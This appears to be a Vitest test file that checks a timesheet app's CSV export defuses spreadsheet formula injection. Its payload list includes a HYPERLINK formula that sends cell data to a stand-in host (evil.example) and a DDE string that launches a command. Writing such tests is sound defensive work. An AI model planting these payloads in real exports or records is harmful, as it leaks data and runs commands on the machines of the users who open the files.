import { beforeAll, describe, expect, it } from 'vitest';
import request from 'supertest';
import type { Express } from 'express';
import { createApp } from '../server/app.js';
import { openDb } from '../server/db.js';
import type { AuthConfig } from '../server/auth.js';
import { EXPORT_PROFILES } from '../server/export-profiles.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

/**
 * As `expectDefused`, but for a payload that reached the file THROUGH the API:
 * text fields are trimmed on the way in, so the stored — and exported — value
 * is the trimmed one. The invariant that matters is unchanged.
 */
function expectDefusedInput(csv: string, payload: string, delimiter = ','): void {
  expectDefused(csv, payload.trim(), delimiter);
}

const auth: AuthConfig = {
  username: 'admin',
  password: 'test-password',
  secret: 'test-secret',
  ttlHours: 1,
  secureCookie: false,
};

async function signIn(app: Express): Promise<string> {
  const res = await request(app).post('/api/login').send({ username: 'admin', password: 'test-password' });
  expect(res.status).toBe(200);
  return res.headers['set-cookie']![0]!.split(';')[0]!;
}

const DAY = '2026-07-20';

let app: Express;
let cookie: string;

/** One booked hour on a project named `project` by an employee named `employee`. */
async function booking(employee: string, project: string, note: string): Promise<void> {
  const emp = await request(app).post('/api/employees').set('Cookie', cookie).send({ name: employee });
  expect(emp.status).toBe(201);
  const proj = await request(app)
    .post('/api/projects')
    .set('Cookie', cookie)
    .send({ name: project, rate_cents: 10_000, billable_default: true });
  expect(proj.status).toBe(201);
  const entry = await request(app).post('/api/entries').set('Cookie', cookie).send({
    employee_id: emp.body.id,
    project_id: proj.body.id,
    entry_date: DAY,
    minutes: 60,
    note,
  });
  expect(entry.status).toBe(201);
}

async function exportCsv(profile: string): Promise<string> {
  const res = await request(app)
    .get(`/api/export/timesheets.csv?profile=${profile}&from=${DAY}&to=${DAY}`)
    .set('Cookie', cookie);
  expect(res.status).toBe(200);
  return res.text;
}

beforeAll(async () => {
  app = createApp({ db: openDb(':memory:'), auth });
  cookie = await signIn(app);
});

/** DETAIL is the per-entry profile, and it is semicolon-separated. */
const DETAIL = ';';

describe('timesheet CSV export neutralizes spreadsheet formulas', () => {
  it.each(PAYLOADS)('defuses %o in an employee name', async (payload) => {
    await booking(payload, 'Ordinary project', 'Ordinary note');
    expectDefusedInput(await exportCsv('DETAIL'), payload, DETAIL);
  });

  it('defuses formulas in project names and entry notes, in every profile', async () => {
    await booking('Ordinary employee', '=1+1', '@SUM(A1)');
    for (const profile of EXPORT_PROFILES) {
      const cells = cellsOf(await exportCsv(profile.name), profile.delimiter);
      for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
    }
    // The note only reaches the file through the per-entry profile.
    expectDefusedInput(await exportCsv('DETAIL'), '@SUM(A1)', DETAIL);
  });

  it('leaves hours and money as values a spreadsheet can compute on', async () => {
    const cells = cellsOf(await exportCsv('DETAIL'), DETAIL);
    expect(cells.some((c) => c.startsWith("'1"))).toBe(false);
    expect(cells).toContain('1.00'); // one hour, dot-decimal
  });
});
